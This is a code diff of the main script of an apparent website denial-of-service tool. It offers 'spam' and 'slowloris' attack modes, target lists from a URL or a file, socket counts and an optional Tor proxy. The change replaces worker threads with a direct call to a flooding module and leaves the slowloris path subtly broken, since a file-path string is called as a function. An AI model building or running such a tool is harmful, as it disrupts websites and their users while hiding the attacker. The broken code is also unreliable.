@@ -1,20 +1,18 @@
 #!/usr/bin/env node
 const { docopt } =      require('docopt');
 const fs =              require('fs').promises;
-const { Worker } =      require('worker_threads');
-
+const spammer         = require('./spammer');
 
 const state = {};
 
 const doc = `Usage:
     ./index.js -h  | --help
-    ./index.js (-u | --url <url>) (-m | --mode <mode>) [-s | --sockets <sockets>] [-t | --threads <threads>] [ --tor ]
-    ./index.js (-f | --file <filepath>) (-m | --mode <mode>) [-s | --sockets <sockets>] [-t | --threads <threads>] [ --tor ]
+    ./index.js (-u | --url <url>) (-m | --mode <mode>) [-s | --sockets <sockets>] [ --tor ]
+    ./index.js (-f | --file <filepath>) (-m | --mode <mode>) [-s | --sockets <sockets>] [ --tor ]
      
 
 Options:
     -h --help          Show this screen
-    -t --threads       Count of threads
     -s --sockets       Count of sockets when using slowloris mode
     -m --mode          Mode of attack (spam | slowloris)
     --tor              Enable tor proxy
@@ -22,8 +20,7 @@ Options:
     -f --file          Path to file with urls
 `;
 
-
-function setState({url, success}){
+function setState({ url, success }){
     console.clear();
     if (success === 'socket') return console.log(JSON.parse(JSON.stringify(url)));
     if (state[url]?.[success]) state[url][success] += 1;
@@ -42,23 +39,15 @@ async function parseFile(filepath){
     return data;
 }
 
-function startBombarding({ urls, threads, tor, mode, sockets = 0 }){
+async function startBombarding({ urls, tor, mode, sockets = 0 }){
     try {
-        const workerFile = mode === 'spam' ? 'spammer' : 'slowloris';
+        const workerFile = mode === 'spam' ? spammer : './slowloris.js';
 
-        if (!threads) return new Worker(`${__dirname}/${workerFile}.js`, { workerData: { urls, tor, sockets } }).on('message', setState).on('error', (err) => console.log(err));
-
-        for (let i = 0; i < threads; i++) {
-            return new Worker(`${__dirname}/${workerFile}.js`, {
-                workerData: { urls, tor, sockets }
-            }).on('message', setState);
-        }
-
+        workerFile({ urls, tor, sockets, setState });
     } catch(err) {
         console.log(err);
     }
 }
-
 
 (async () => {
     const {
@@ -87,6 +76,6 @@ function startBombarding({ urls, threads, tor, mode, sockets = 0 }){
             process.exit(1);
         }
     });
-    
+
     startBombarding({ urls, threads, tor, mode, sockets })
 })();
